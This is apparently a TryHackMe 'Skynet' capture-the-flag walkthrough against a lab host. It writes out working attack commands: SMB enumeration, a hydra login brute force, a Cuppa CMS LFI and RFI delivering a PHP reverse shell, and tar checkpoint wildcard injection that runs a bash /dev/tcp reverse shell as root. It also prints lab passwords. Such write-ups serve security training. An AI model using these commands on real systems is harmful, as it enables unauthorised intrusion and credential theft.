# Skynet

**Room Link:** [https://tryhackme.com/room/skynet](https://tryhackme.com/room/skynet)

```
nmap -A 10.10.13.172
```

<figure><img src="../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

```
smbclient -L //10.10.13.172
```

<figure><img src="../../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>

```
smbget -R smb://10.10.13.172/anonymous
cat logs/log* | sort | uniq  > passwords.txt 
```

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

There is also an email from Miles Dyson, as it's just his name I tried different varations of his name for a username. There is a folder on samba that could be the username as well, milesdyson.&#x20;

<figure><img src="../../.gitbook/assets/image (5) (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (4).png" alt=""><figcaption><p>username.txt</p></figcaption></figure>





```
gobuster dir 10.10.13.172 -u http://10.10.13.172 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>



```
hydra -l milesdyson -P passwords.txt 10.10.13.172 http-post-form "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F incorrect" -V -F -u
```

<figure><img src="../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

We can now login to squirrelmail that gobuster discovered.

<figure><img src="../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (9) (3) (2).png" alt=""><figcaption></figcaption></figure>

Downloaded all the files from the milesdyson folder on smb.

```
smbget -R smb://10.10.13.172/milesdyson -U milesdyson
Password: )s{A&2Z=F^n_E.B`
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>

```
gobuster dir 10.10.13.172 -u http://10.10.13.172/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

None of the passwords worked or default credentials for cuppa.

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Found an exploit for cuppa LFI/RFI

```
searchsploit cuppa
searchsploit -x php/webapps/25971.txt
```

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Testing LFI and it works

```
http://10.10.13.172/45kra24zxs28v3yd/administrator//alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we will try RFI to get a reverse shell

**Kali #1**&#x20;

Create PHP reverse shell then host the file

<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>

```
python2 -m SimpleHTTPServer 81
```

**Kali #2**

```
nc -lvnp 1337
```

**Browser**

```
http://10.10.13.172:81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.243.233/revshell.php
```

<figure><img src="../../.gitbook/assets/image (18) (2) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

There is a backup script that is ran every minute by root which backs up /var/www/html

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

****

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

We can use the following from gtfo to create a reverse shell. The checkpoint argument lets us run a command before the files are tar'd so we will create a reverse shell in /var/www/html and then the commands will execute when the folder is tar'd next.

****

**Exploit Link:** [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)

```
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.10.243.233/1338 0>&1' > /var/www/html/shell
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell
```

**Kali**

```
nc -nvlp 1338
```

<figure><img src="../../.gitbook/assets/image (1) (1) (2).png" alt=""><figcaption></figcaption></figure>

There is a password in the configuration file, it does not work for root but we see in the home directory another user called jjameson

```
cat /var/www/html/configuration.php
```

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

We can login as jjameson&#x20;

```
su jjameson
Password: nv5uz9r3ZEDzVjNu
```
